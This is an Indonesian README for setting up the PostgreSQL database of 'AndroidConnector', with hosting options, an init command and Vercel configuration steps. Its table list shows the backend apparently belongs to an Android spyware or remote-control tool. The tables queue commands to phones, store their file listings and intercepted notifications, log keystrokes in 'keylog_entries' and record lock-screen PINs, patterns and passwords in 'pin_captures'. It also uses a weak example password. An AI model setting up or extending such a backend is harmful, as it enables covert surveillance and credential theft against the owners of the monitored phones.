# Database Setup — AndroidConnector

Database milik sendiri tanpa Neon / layanan Vercel.

---

## Cara Setup (Pilih salah satu)

### Option 1 — Supabase (Gratis, Recommended)
1. Buka https://supabase.com → **New Project**
2. Isi nama project, password database, pilih region terdekat
3. Tunggu ~2 menit sampai selesai
4. Buka **Settings → Database → Connection String → URI**
5. Copy string seperti:
   ```
   postgresql://postgres:[PASSWORD]@db.xxxx.supabase.co:5432/postgres
   ```

### Option 2 — Railway (Gratis $5/bulan credit)
1. Buka https://railway.app → **New Project → PostgreSQL**
2. Klik PostgreSQL → **Connect → PostgreSQL Connection URL**
3. Copy connection string

### Option 3 — Server sendiri (VPS)
```bash
# Install PostgreSQL
sudo apt install postgresql -y
sudo -u postgres psql -c "CREATE USER androidconn WITH PASSWORD 'password123';"
sudo -u postgres psql -c "CREATE DATABASE androidconnector OWNER androidconn;"
# Connection string:
# postgresql://androidconn:password123@YOUR_VPS_IP:5432/androidconnector
```

---

## Setup Tabel

Setelah dapat connection string:

```bash
# Set DATABASE_URL
export DATABASE_URL="postgresql://user:pass@host:5432/dbname"

# Buat semua tabel
node database/init.js
```

---

## Set di Vercel

1. Buka https://vercel.com → Project → **Settings → Environment Variables**
2. Hapus `DATABASE_URL` lama (yang Neon)
3. Tambah baru:
   - **Key**: `DATABASE_URL`
   - **Value**: connection string milik sendiri
   - **Environment**: Production, Preview, Development
4. Klik **Save** → **Redeploy**

---

## Tabel yang Dibuat

| Tabel | Fungsi |
|-------|--------|
| `devices` | Perangkat yang terdaftar |
| `pending_commands` | Antrian perintah |
| `command_history` | Riwayat perintah |
| `file_listings` | Daftar file dari HP |
| `notifications` | Notifikasi yang ditangkap |
| `keylog_entries` | Teks yang diketik (Keylogger) |
| `pin_captures` | PIN / Pola / Sandi lock screen |
